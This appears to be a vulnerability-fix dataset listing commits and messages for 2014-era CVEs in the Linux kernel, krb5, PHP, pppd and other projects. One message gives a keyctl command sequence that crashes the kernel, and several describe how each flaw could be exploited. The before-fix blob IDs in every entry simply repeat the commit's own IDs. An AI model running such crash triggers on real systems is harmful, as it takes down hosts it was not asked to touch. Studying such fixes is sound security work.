futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call.  If we attempt this, then dangling pointers may be left for rt_waiter resulting in an exploitable condition.\n\nThis change brings futex_requeue() in line with futex_wait_requeue_pi() which performs the same check as per commit 6f7b0a2a5c0f ("futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()")\n\n[ tglx: Compare the resulting keys as well, as uaddrs might be   	different depending on the mapping ]\n\nFixes CVE-2014-3153.\n\nReported-by: Pinkie Pie Signed-off-by: Will Drewry <wad@chromium.org> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Reviewed-by: Darren Hart <dvhart@linux.intel.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7658e8257183f062dc01f87969c140707c7e52cb
File(s) In Commit: 
    pppd/options.c
Blob(s) In Commit: 
    e9042d1f64e2b5bbf05c74a91587f049f011c2b8
Blob(s) Before Fix: 
    e9042d1f64e2b5bbf05c74a91587f049f011c2b8
Projects:
    AICP_android_device_samsung_maguro
Commit Message for 7658e8257183f062dc01f87969c140707c7e52cb:
pppd: Eliminate potential integer overflow in option parsing\n\nWhen we are reading in a word from an options file, we maintain a count of the length we have seen so far in 'len', which is an int.  When len exceeds MAXWORDLEN - 1 (i.e. 1023) we cease storing characters in the buffer but we continue to increment len.  Since len is an int, it will wrap around to -2147483648 after it reaches 2147483647.  At that point our test of (len < MAXWORDLEN-1) will succeed and we will start writing characters to memory again.\n\nThis may enable an attacker to overwrite the heap and thereby corrupt security-relevant variables.  For this reason it has been assigned a CVE identifier, CVE-2014-3158.\n\nThis fixes the bug by ceasing to increment len once it reaches MAXWORDLEN.\n\nReported-by: Lee Campbell <leecam@google.com> Signed-off-by: Paul Mackerras <paulus@samba.org>

======================================================================
Commit With Fix: 
    c54def7bd64d7c0b6993336abcffb8444795bf38
File(s) In Commit: 
    drivers/hid/hid-magicmouse.c
Blob(s) In Commit: 
    29a74c1efcb85fa727536c4b72be844f9963cd70
Blob(s) Before Fix: 
    29a74c1efcb85fa727536c4b72be844f9963cd70
Projects:
    0-T-0_ps4-linux
Commit Message for c54def7bd64d7c0b6993336abcffb8444795bf38:
HID: magicmouse: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that magicmouse_emit_touch() gets only valid values of raw_id.\n\nCc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    ad3e14d7c5268c2e24477c6ef54bbdf88add5d36
File(s) In Commit: 
    drivers/hid/hid-logitech-dj.c
Blob(s) In Commit: 
    b7ba82960c7925c5d04eb898af55a95b3be058f4
Blob(s) Before Fix: 
    b7ba82960c7925c5d04eb898af55a95b3be058f4
Projects:
    0-T-0_ps4-linux
Commit Message for ad3e14d7c5268c2e24477c6ef54bbdf88add5d36:
HID: logitech: perform bounds checking on device_id early enough\n\ndevice_index is a char type and the size of paired_dj_deivces is 7 elements, therefore proper bounds checking has to be applied to device_index before it is used.\n\nWe are currently performing the bounds checking in logi_dj_recv_add_djhid_device(), which is too late, as malicious device could send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the problem in one of the report forwarding functions called from logi_dj_raw_event().\n\nFix this by performing the check at the earliest possible ocasion in logi_dj_raw_event().\n\nCc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    51217e69697fba92a06e07e16f55c9a52d8e8945
File(s) In Commit: 
    drivers/hid/hid-logitech-dj.c
Blob(s) In Commit: 
    ca0ab5112efd6e152b0f5d6a6fd044da0bd33089
Blob(s) Before Fix: 
    ca0ab5112efd6e152b0f5d6a6fd044da0bd33089
Projects:
    0-T-0_ps4-linux
Commit Message for 51217e69697fba92a06e07e16f55c9a52d8e8945:
HID: logitech: fix bounds checking on LED report size\n\nThe check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request() is wrong  the current check doesn't make any sense -- the report allocated by HID core in hid_hw_raw_request() can be much larger than DJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't handle this properly at all.\n\nFix the check by actually trimming down the report size properly if it is too large.\n\nCc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    6817ae225cd650fb1c3295d769298c38b1eba818
File(s) In Commit: 
    drivers/usb/serial/whiteheat.c
Blob(s) In Commit: 
    6c3734d2b45a7a9ca24557a586ba10135b7cadb3
Blob(s) Before Fix: 
    6c3734d2b45a7a9ca24557a586ba10135b7cadb3
Projects:
    0-T-0_ps4-linux
Commit Message for 6817ae225cd650fb1c3295d769298c38b1eba818:
USB: whiteheat: Added bounds checking for bulk command response\n\nThis patch fixes a potential security issue in the whiteheat USB driver which might allow a local attacker to cause kernel memory corrpution. This is due to an unchecked memcpy into a fixed size buffer (of 64 bytes). On EHCI and XHCI busses it's possible to craft responses greater than 64 bytes leading a buffer overflow.\n\nSigned-off-by: James Forshaw <forshaw@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    844817e47eef14141cf59b8d5ac08dd11c0a9189
File(s) In Commit: 
    drivers/hid/hid-picolcd_core.c
Blob(s) In Commit: 
    020df3c2e8b42717c62bbe0470aa47845535e4a5
Blob(s) Before Fix: 
    020df3c2e8b42717c62bbe0470aa47845535e4a5
Projects:
    0-T-0_ps4-linux
Commit Message for 844817e47eef14141cf59b8d5ac08dd11c0a9189:
HID: picolcd: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that raw_data that we hold in picolcd_pending structure are always kept within proper bounds.\n\nCc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    27a14bc7ba285a0a5ebfdb55e54001aa11932b08
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    6d694192121d0651a46eb737926457a3b014fcab
Blob(s) Before Fix: 
    6d694192121d0651a46eb737926457a3b014fcab
Projects:
    5hadowblad3_file
Commit Message for 27a14bc7ba285a0a5ebfdb55e54001aa11932b08:
Correctly compute the truncated pascal string size (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    36fadd29849b8087af9f4586f89dbf74ea45be67
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    0bfb31a229af5fc05579593e3ea83568b88cf3bb
Blob(s) Before Fix: 
    0bfb31a229af5fc05579593e3ea83568b88cf3bb
Projects:
    5hadowblad3_file
Commit Message for 36fadd29849b8087af9f4586f89dbf74ea45be67:
Use the proper sector size when checking stream offsets (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    40bade80cbe2af1d0b2cd0420cebd5d5905a2382
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    6652581c27b843379a3e47b5223be9e7c9485445
Blob(s) Before Fix: 
    6652581c27b843379a3e47b5223be9e7c9485445
Projects:
    5hadowblad3_file
Commit Message for 40bade80cbe2af1d0b2cd0420cebd5d5905a2382:
Fix incorrect bounds check for sector count. (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    93e063ee374b6a75729df9e7201fb511e47e259d
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    c258e82f35def06e1d031222ec7bb2d9d2b16228
Blob(s) Before Fix: 
    c258e82f35def06e1d031222ec7bb2d9d2b16228
Projects:
    5hadowblad3_file
Commit Message for 93e063ee374b6a75729df9e7201fb511e47e259d:
Add missing check offset test (Francisco Alonso, Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    2fa9400a59d0563a66908aba55c41e7285a04994
File(s) In Commit: 
    src/main/java/org/jboss/netty/handler/ssl/SslHandler.java
Blob(s) In Commit: 
    c3bb18d4cb6f7324d3474800c05013ce16c67332
Blob(s) Before Fix: 
    c3bb18d4cb6f7324d3474800c05013ce16c67332
Projects:
    007arsen_netty
Commit Message for 2fa9400a59d0563a66908aba55c41e7285a04994:
Fix a bug where SslHandler does not handle SSLv2Hello correctly\n\nMotivation:\n\nWhen a SSLv2Hello message is received, SSLEngine expects the application buffer size to be more than 30KB which is larger than what SslBufferPool can provide.  SSLEngine will always return with BUFFER_OVERFLOW status, blocking the SSL session from continuing the handshake.\n\nModifications:\n\nWhen SSLEngine.getSession().getApplicationBufferSize() returns a value larger than what SslBufferPool provides, allocate a temporary heap buffer.\n\nResult:\n\nSSLv2Hello is handled correctly.

======================================================================
Commit With Fix: 
    dab6cf55f81a6e16b8147aed9a843e1691dcd318
File(s) In Commit: 
    arch/s390/kernel/ptrace.c
Blob(s) In Commit: 
    5dc7ad9e2fbf2d1b035194b30db18a82957c1358
Blob(s) Before Fix: 
    5dc7ad9e2fbf2d1b035194b30db18a82957c1358
Projects:
    0-T-0_ps4-linux
Commit Message for dab6cf55f81a6e16b8147aed9a843e1691dcd318:
s390/ptrace: fix PSW mask check\n\nThe PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect. The PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace interface accepts all combinations for the address-space-control bits. To protect the kernel space the PSW mask check in ptrace needs to reject the address-space-control bit combination for home space.\n\nFixes CVE-2014-3534\n\nCc: stable@vger.kernel.org Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    ce5a785b0962c3c94c7a7b0d36176482d21db95d
File(s) In Commit: 
    user/profile.php
Blob(s) In Commit: 
    291fc131f6fd5e087431fd68114d2d66b46f6e0a
Blob(s) Before Fix: 
    291fc131f6fd5e087431fd68114d2d66b46f6e0a
Projects:
    007durgesh219_moodle
Commit Message for ce5a785b0962c3c94c7a7b0d36176482d21db95d:
MDL-45683 user: Escaping Skype ID used in profile

======================================================================
Commit With Fix: 
    2fefae47716d501aec41c1102f3fd4531f070b05
File(s) In Commit: 
    ext/standard/dns.c
Blob(s) In Commit: 
    0b5e69ca58cc13b9f4e7f78dbac0c89aa5fb5e26
Blob(s) Before Fix: 
    0b5e69ca58cc13b9f4e7f78dbac0c89aa5fb5e26
Projects:
    0014593_php-src
Commit Message for 2fefae47716d501aec41c1102f3fd4531f070b05:
Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597\n\nIncomplete fix for CVE-2014-4049\n\nCheck possible buffer overflow - pass real buffer end to dn_expand calls - check buffer len before each read

======================================================================
Commit With Fix: 
    350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7
File(s) In Commit: 
    virt/kvm/iommu.c
Blob(s) In Commit: 
    714b949323120aee855dd7e57db549cac31e8183
Blob(s) Before Fix: 
    714b949323120aee855dd7e57db549cac31e8183
Projects:
    0-T-0_ps4-linux
Commit Message for 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7:
kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)\n\nThe third parameter of kvm_iommu_put_pages is wrong, It should be 'gfn - slot->base_gfn'.\n\nBy making gfn very large, malicious guest or userspace can cause kvm to go to this error path, and subsequently to pass a huge value as size. Alternatively if gfn is small, then pages would be pinned but never unpinned, causing host memory leak and local DOS.\n\nPassing a reasonable but large value could be the most dangerous case, because it would unpin a page that should have stayed pinned, and thus allow the device to DMA into arbitrary memory.  However, this cannot happen because of the condition that can trigger the error:\n\n- out of memory (where you can't allocate even a single page)   should not be possible for the attacker to trigger\n\n- when exceeding the iommu's address space, guest pages after gfn   will also exceed the iommu's address space, and inside   kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The   page thus would not be unpinned at all.\n\nReported-by: Jack Morgenstein <jackm@mellanox.com> Cc: stable@vger.kernel.org Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    2febc839133280d5a5e8e1179c94ea674489dae2
File(s) In Commit: 
    arch/x86/kvm/i8254.c
Blob(s) In Commit: 
    298781d4cfb44b7c6d6536d6d2779ada2eeb150a
Blob(s) Before Fix: 
    298781d4cfb44b7c6d6536d6d2779ada2eeb150a
Projects:
    0-T-0_ps4-linux
Commit Message for 2febc839133280d5a5e8e1179c94ea674489dae2:
KVM: x86: Improve thread safety in pit\n\nThere's a race condition in the PIT emulation code in KVM.  In __kvm_migrate_pit_timer the pit_timer object is accessed without synchronization.  If the race condition occurs at the wrong time this can crash the host kernel.\n\nThis fixes CVE-2014-3611.\n\nCc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    95389b08d93d5c06ec63ab49bd732b0069b7c35e
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    2404d03e251a64ae7634d30c46aa22a08f9b4538
Blob(s) Before Fix: 
    2404d03e251a64ae7634d30c46aa22a08f9b4538
Projects:
    0-T-0_ps4-linux
Commit Message for 95389b08d93d5c06ec63ab49bd732b0069b7c35e:
KEYS: Fix termination condition in assoc array garbage collection\n\nThis fixes CVE-2014-3631.\n\nIt is possible for an associative array to end up with a shortcut node at the root of the tree if there are more than fan-out leaves in the tree, but they all crowd into the same slot in the lowest level (ie. they all have the same first nibble of their index keys).\n\nWhen assoc_array_gc() returns back up the tree after scanning some leaves, it can fall off of the root and crash because it assumes that the back pointer from a shortcut (after label ascend_old_tree) must point to a normal node - which isn't true of a shortcut node at the root.\n\nShould we find we're ascending rootwards over a shortcut, we should check to see if the backpointer is zero - and if it is, we have completed the scan.\n\nThis particular bug cannot occur if the root node is not a shortcut - ie. if you have fewer than 17 keys in a keyring or if you have at least two keys that sit into separate slots (eg. a keyring and a non keyring).\n\nThis can be reproduced by:\n\n	ring=`keyctl newring bar @s` 	for ((i=1  i<=18  i++))  do last_key=`keyctl newring foo$i $ring`  done 	keyctl timeout $last_key 2\n\nDoing this:\n\n	echo 3 >/proc/sys/kernel/keys/gc_delay\n\nfirst will speed things up.\n\nIf we do fall off of the top of the tree, we get the following oops:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000018 IP: [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 PGD dae15067 PUD cfc24067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: xt_nat xt_mark nf_conntrack_netbios_ns nf_conntrack_broadcast ip6t_rpfilter ip6t_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables ip6table_ni CPU: 0 PID: 26011 Comm: kworker/0:1 Not tainted 3.14.9-200.fc20.x86_64 #1 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 Workqueue: events key_garbage_collector task: ffff8800918bd580 ti: ffff8800aac14000 task.ti: ffff8800aac14000 RIP: 0010:[<ffffffff8136cea7>] [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 RSP: 0018:ffff8800aac15d40  EFLAGS: 00010206 RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffff8800aaecacc0 RDX: ffff8800daecf440 RSI: 0000000000000001 RDI: ffff8800aadc2bc0 RBP: ffff8800aac15da8 R08: 0000000000000001 R09: 0000000000000003 R10: ffffffff8136ccc7 R11: 0000000000000000 R12: 0000000000000000 R13: 0000000000000000 R14: 0000000000000070 R15: 0000000000000001 FS:  0000000000000000(0000) GS:ffff88011fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b CR2: 0000000000000018 CR3: 00000000db10d000 CR4: 00000000000006f0 Stack:  ffff8800aac15d50 0000000000000011 ffff8800aac15db8 ffffffff812e2a70  ffff880091a00600 0000000000000000 ffff8800aadc2bc3 00000000cd42c987  ffff88003702df20 ffff88003702dfa0 0000000053b65c09 ffff8800aac15fd8 Call Trace:  [<ffffffff812e2a70>] ? keyring_detect_cycle_iterator+0x30/0x30  [<ffffffff812e3e75>] keyring_gc+0x75/0x80  [<ffffffff812e1424>] key_garbage_collector+0x154/0x3c0  [<ffffffff810a67b6>] process_one_work+0x176/0x430  [<ffffffff810a744b>] worker_thread+0x11b/0x3a0  [<ffffffff810a7330>] ? rescuer_thread+0x3b0/0x3b0  [<ffffffff810ae1a8>] kthread+0xd8/0xf0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40  [<ffffffff816ffb7c>] ret_from_fork+0x7c/0xb0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40 Code: 08 4c 8b 22 0f 84 bf 00 00 00 41 83 c7 01 49 83 e4 fc 41 83 ff 0f 4c 89 65 c0 0f 8f 5a fe ff ff 48 8b 45 c0 4d 63 cf 49 83 c1 02 <4e> 8b 34 c8 4d 85 f6 0f 84 be 00 00 00 41 f6 c6 01 0f 84 92 RIP  [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540  RSP <ffff8800aac15d40> CR2: 0000000000000018 ---[ end trace 1129028a088c0cbd ]---\n\nSigned-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    d974baa398f34393db76be45f7d4d04fbdbb4a0a
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    0acac81f198b0b03c83b4f4f9ef86178fa84f821
Blob(s) Before Fix: 
    0acac81f198b0b03c83b4f4f9ef86178fa84f821
Projects:
    0-T-0_ps4-linux
Commit Message for d974baa398f34393db76be45f7d4d04fbdbb4a0a:
x86,kvm,vmx: Preserve CR4 across VM entry\n\nCR4 isn't constant  at least the TSD and PCE bits can vary.\n\nTBH, treating CR0 and CR3 as constant scares me a bit, too, but it looks like it's correct.\n\nThis adds a branch and a read from cr4 to each vm entry.  Because it is extremely likely that consecutive entries into the same vcpu will have the same host cr4 value, this fixes up the vmcs instead of restoring cr4 after the fact.  A subsequent patch will add a kernel-wide cr4 shadow, reducing the overhead in the common case to just two memory reads and a branch.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: Paolo Bonzini <pbonzini@redhat.com> Cc: stable@vger.kernel.org Cc: Petr Matousek <pmatouse@redhat.com> Cc: Gleb Natapov <gleb@kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e001e38738c17219a1d9dd8c31f7d82b9c0013c7
File(s) In Commit: 
    lib/printer.js
Blob(s) In Commit: 
    6cb06da1a5ad661ee80761bf24e93b528de4baf6
Blob(s) Before Fix: 
    6cb06da1a5ad661ee80761bf24e93b528de4baf6
Projects:
    5sword_electron-printer
Commit Message for e001e38738c17219a1d9dd8c31f7d82b9c0013c7:
Removed possible command injection

======================================================================
Commit With Fix: 
    c151e0660b9736fe66b224f1129a16871165251b
File(s) In Commit: 
    src/mongo/db/commands/authentication_commands.cpp
Blob(s) In Commit: 
    2bfbe96cba0a75f0fa84d0ae869c6829ea629cba
Blob(s) Before Fix: 
    2bfbe96cba0a75f0fa84d0ae869c6829ea629cba
Projects:
    0101011_mongo
Commit Message for c151e0660b9736fe66b224f1129a16871165251b:
SERVER-13573 Fix x.509 auth exception

======================================================================
Commit With Fix: 
    c2aafc823bd85876f5e888f8ebc421069a5e076f
File(s) In Commit: 
    upload/system/library/cart.php
Blob(s) In Commit: 
    bea97218b3f517d61980a184f8df0f7ccdca3d07
Blob(s) Before Fix: 
    bea97218b3f517d61980a184f8df0f7ccdca3d07
Projects:
    ADDCreative_opencart-ce
Commit Message for c2aafc823bd85876f5e888f8ebc421069a5e076f:
Protection from object injection in cart\n\nhttps://github.com/opencart/opencart/issues/1534

======================================================================
Commit With Fix: 
    4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc
File(s) In Commit: 
    drivers/target/target_core_rd.c
Blob(s) In Commit: 
    e9fa879ac27f31f5cbdd61fecf29c4095b366b50
Blob(s) Before Fix: 
    e9fa879ac27f31f5cbdd61fecf29c4095b366b50
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc:
target/rd: Refactor rd_build_device_space + rd_release_device_space\n\nThis patch refactors rd_build_device_space() + rd_release_device_space() into rd_allocate_sgl_table() + rd_release_device_space() so that they may be used seperatly for setup + release of protection information scatterlists.\n\nAlso add explicit memset of pages within rd_allocate_sgl_table() based upon passed 'init_payload' value.\n\nv2 changes:   - Drop unused sg_table from rd_release_device_space (Wei)\n\nCc: Martin K. Petersen <martin.petersen@oracle.com> Cc: Christoph Hellwig <hch@lst.de> Cc: Hannes Reinecke <hare@suse.de> Cc: Sagi Grimberg <sagig@mellanox.com> Cc: Or Gerlitz <ogerlitz@mellanox.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>

======================================================================
Commit With Fix: 
    b34d7849ed90ced9345f8ea1c59bc8d101c18468
File(s) In Commit: 
    ext/standard/dns.c
Blob(s) In Commit: 
    214a7dc7e92faf55a2f69be27adbb8ea99ab403f
Blob(s) Before Fix: 
    214a7dc7e92faf55a2f69be27adbb8ea99ab403f
Projects:
    0014593_php-src
Commit Message for b34d7849ed90ced9345f8ea1c59bc8d101c18468:
Merge branch 'PHP-5.6'\n\n* PHP-5.6:   Fix potential segfault in dns_get_record()

======================================================================
Commit With Fix: 
    137f7df8cead00688524c82360930845396b8a21
File(s) In Commit: 
    arch/mips/include/asm/thread_info.h
Blob(s) In Commit: 
    e80ae50cae80c916700b789a707ab9b2dad65be7
Blob(s) Before Fix: 
    e80ae50cae80c916700b789a707ab9b2dad65be7
Projects:
    0-T-0_ps4-linux
Commit Message for 137f7df8cead00688524c82360930845396b8a21:
MIPS: asm: thread_info: Add _TIF_SECCOMP flag\n\nAdd _TIF_SECCOMP flag to _TIF_WORK_SYSCALL_ENTRY to indicate that the system call needs to be checked against a seccomp filter.\n\nSigned-off-by: Markos Chandras <markos.chandras@imgtec.com> Reviewed-by: Paul Burton <paul.burton@imgtec.com> Reviewed-by: James Hogan <james.hogan@imgtec.com> Cc: linux-mips@linux-mips.org Patchwork: https://patchwork.linux-mips.org/patch/6405/ Signed-off-by: Ralf Baechle <ralf@linux-mips.org>

======================================================================
Commit With Fix: 
    d3fc5eb142ff16d55d158afb050af18d5ff09120
File(s) In Commit: 
    ajenti/routing.py
Blob(s) In Commit: 
    cc460f5172cb4e7eccd254a96433819bf702ec54
Blob(s) Before Fix: 
    cc460f5172cb4e7eccd254a96433819bf702ec54
Projects:
    13768324554_ajenti
Commit Message for d3fc5eb142ff16d55d158afb050af18d5ff09120:
[http] fix traceback page xss

======================================================================
Commit With Fix: 
    f18ddf5d82de0ab7591a36e465bc24225776940f
File(s) In Commit: 
    src/lib/gssapi/spnego/spnego_mech.c
Blob(s) In Commit: 
    8f829d8c5920f1ac530d68fa9bbb307011e5eeaa
Blob(s) Before Fix: 
    8f829d8c5920f1ac530d68fa9bbb307011e5eeaa
Projects:
    3van_krb5
Commit Message for f18ddf5d82de0ab7591a36e465bc24225776940f:
Fix double-free in SPNEGO [CVE-2014-4343]\n\nIn commit cd7d6b08 ("Verify acceptor's mech in SPNEGO initiator") the pointer sc->internal_mech became an alias into sc->mech_set->elements, which should be considered constant for the duration of the SPNEGO context.  So don't free it.\n\nCVE-2014-4343:\n\nIn MIT krb5 releases 1.10 and newer, an unauthenticated remote attacker with the ability to spoof packets appearing to be from a GSSAPI acceptor can cause a double-free condition in GSSAPI initiators (clients) which are using the SPNEGO mechanism, by returning a different underlying mechanism than was proposed by the initiator.  At this stage of the negotiation, the acceptor is unauthenticated, and the acceptor's response could be spoofed by an attacker with the ability to inject traffic to the initiator.\n\nHistorically, some double-free vulnerabilities can be translated into remote code execution, though the necessary exploits must be tailored to the individual application and are usually quite complicated. Double-frees can also be exploited to cause an application crash, for a denial of service.  However, most GSSAPI client applications are not vulnerable, as the SPNEGO mechanism is not used by default (when GSS_C_NO_OID is passed as the mech_type argument to gss_init_sec_context()).  The most common use of SPNEGO is for HTTP-Negotiate, used in web browsers and other web clients.  Most such clients are believed to not offer HTTP-Negotiate by default, instead requiring a whitelist of sites for which it may be used to be configured.  If the whitelist is configured to only allow HTTP-Negotiate over TLS connections ("https://"), a successful attacker must also spoof the web server's SSL certificate, due to the way the WWW-Authenticate header is sent in a 401 (Unauthorized) response message.  Unfortunately, many instructions for enabling HTTP-Negotiate in common web browsers do not include a TLS requirement.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C\n\n[kaduk@mit.edu: CVE summary and CVSSv2 vector]\n\nticket: 7969 (new) target_version: 1.12.2 tags: pullup

======================================================================
Commit With Fix: 
    dc7ed55c689d57de7f7408b34631bf06fec9dab1
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    111b55485183a38eaa7caf979acf0a8a3fa34da3
Blob(s) Before Fix: 
    111b55485183a38eaa7caf979acf0a8a3fa34da3
Projects:
    3van_krb5
Commit Message for dc7ed55c689d57de7f7408b34631bf06fec9dab1:
Fix LDAP key data segmentation [CVE-2014-4345]\n\nFor principal entries having keys with multiple kvnos (due to use of -keepold), the LDAP KDB module makes an attempt to store all the keys having the same kvno into a single krbPrincipalKey attribute value. There is a fencepost error in the loop, causing currkvno to be set to the just-processed value instead of the next kvno.  As a result, the second and all following groups of multiple keys by kvno are each stored in two krbPrincipalKey attribute values.  Fix the loop to use the correct kvno value.\n\nCVE-2014-4345:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause it to perform an out-of-bounds write (buffer overrun) by performing multiple cpw -keepold operations.  An off-by-one error while copying key information to the new database entry results in keys sharing a common kvno being written to different array buckets, in an array whose size is determined by the number of kvnos present.  After sufficient iterations, the extra writes extend past the end of the (NULL-terminated) array.  The NULL terminator is always written after the end of the loop, so no out-of-bounds data is read, it is only written.\n\nHistorically, it has been possible to convert an out-of-bounds write into remote code execution in some cases, though the necessary exploits must be tailored to the individual application and are usually quite complicated.  Depending on the allocated length of the array, an out-of-bounds write may also cause a segmentation fault and/or application crash.\n\n    CVSSv2 Vector: AV:N/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C\n\n[ghudson@mit.edu: clarified commit message] [kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\n(cherry picked from commit 81c332e29f10887c6b9deb065f81ba259f4c7e03)\n\nticket: 7980 version_fixed: 1.12.2 status: resolved

======================================================================
Commit With Fix: 
    910c36089940e81fb85c65b8e63dcd2fac71470c
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    b3d2f0b30265e4966b68a183e3be4fd0ced431d6
Blob(s) Before Fix: 
    b3d2f0b30265e4966b68a183e3be4fd0ced431d6
Projects:
    0111001101111010_cgminer
Commit Message for 910c36089940e81fb85c65b8e63dcd2fac71470c:
stratum: parse_notify(): Don't die on malformed bbversion/prev_hash/nbit/ntime.\n\nMight have introduced a memory leak, don't have time to check. :(\n\nShould the other hex2bin()'s be checked?\n\nThanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this.

======================================================================
Commit With Fix: 
    206a81c18401c0cde6e579164f752c4b147324ce
File(s) In Commit: 
    lib/lzo/lzo1x_decompress_safe.c
Blob(s) In Commit: 
    8563081e8da38fb81e0335d2589c9fcebcd81266
Blob(s) Before Fix: 
    8563081e8da38fb81e0335d2589c9fcebcd81266
Projects:
    0-T-0_ps4-linux
Commit Message for 206a81c18401c0cde6e579164f752c4b147324ce:
lzo: properly check for overruns\n\nThe lzo decompressor can, if given some really crazy data, possibly overrun some variable types.  Modify the checking logic to properly detect overruns before they happen.\n\nReported-by: "Don A. Bailey" <donb@securitymouse.com> Tested-by: "Don A. Bailey" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    206204a1162b995e2185275167b22468c00d6b36
File(s) In Commit: 
    lib/lz4/lz4_decompress.c
Blob(s) In Commit: 
    99a03acb7d470570b816ada76f8045d9930c6a27
Blob(s) Before Fix: 
    99a03acb7d470570b816ada76f8045d9930c6a27
Projects:
    0-T-0_ps4-linux
Commit Message for 206204a1162b995e2185275167b22468c00d6b36:
lz4: ensure length does not wrap\n\nGiven some pathologically compressed data, lz4 could possibly decide to wrap a few internal variables, causing unknown things to happen.  Catch this before the wrapping happens and abort the decompression.\n\nReported-by: "Don A. Bailey" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    fd9f26e4eca5d08a27d12c0933fceef76ed9663d
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    5c49f976fc7b3c93351b2b417e919002802c8e4c
Blob(s) Before Fix: 
    5c49f976fc7b3c93351b2b417e919002802c8e4c
Projects:
    0-T-0_ps4-linux
Commit Message for fd9f26e4eca5d08a27d12c0933fceef76ed9663d:
